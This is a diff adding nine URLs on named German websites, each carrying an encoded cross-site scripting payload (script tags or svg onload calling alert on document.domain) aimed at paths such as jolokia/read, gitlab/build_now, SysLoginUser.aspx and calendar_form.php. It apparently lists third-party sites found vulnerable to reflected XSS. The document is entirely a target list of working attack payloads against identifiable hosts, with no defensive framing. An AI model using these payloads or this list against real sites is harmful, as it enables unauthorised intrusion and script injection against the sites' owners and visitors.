@@ -1,0 +1,9 @@
+http://gehort.immeta.de/printenv.shtml?%3Cscript%3Ealert(%27xss%27)%3C/script%3E
+http://getacs.de/ie50/system/login/SysLoginUser.aspx?Login=Denied&UID=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://getraenke-team.de/jolokia/read%3Csvg%20onload=alert%28document.domain%29%3E?mimeType=text/html
+http://globaltherm.de/jolokia/read%3Csvg%20onload=alert%28document.domain%29%3E?mimeType=text/html
+http://gofair.de/gitlab/build_now%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://grundbesitz.immeta.de/ics?query=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&tool=search
+http://gut-ziel-geiselbullach.de/calendar_form.php/%22%3E%3Cscript%3Ealert%28document.domain%29%3C/script%3E
+https://gehrden-suche.de/gitlab/build_now%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+https://grossenhain-zone.de/gitlab/build_now%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
